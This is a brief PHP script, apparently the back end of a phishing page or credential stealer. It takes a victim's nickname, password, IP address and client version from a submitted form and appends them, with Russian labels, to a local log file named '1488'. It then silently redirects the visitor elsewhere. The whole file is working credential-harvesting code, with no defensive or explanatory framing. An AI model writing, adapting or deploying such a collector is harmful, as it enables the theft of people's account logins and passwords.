<?PHP
$login = $_POST['login']; 
$pass = $_POST['pass']; 
$ip = $_POST['ip']; 
$vers = $_POST['vers']; 

$log = fopen("1488","a+"); 
fwrite($log,"\nНик: [$login] ; Пароль: [$pass] ; IP: [$ip] ; Версия: [$vers] \n "); 
fclose($log);
echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=http://qqEPTA/end.php'></head></html>"; 
?>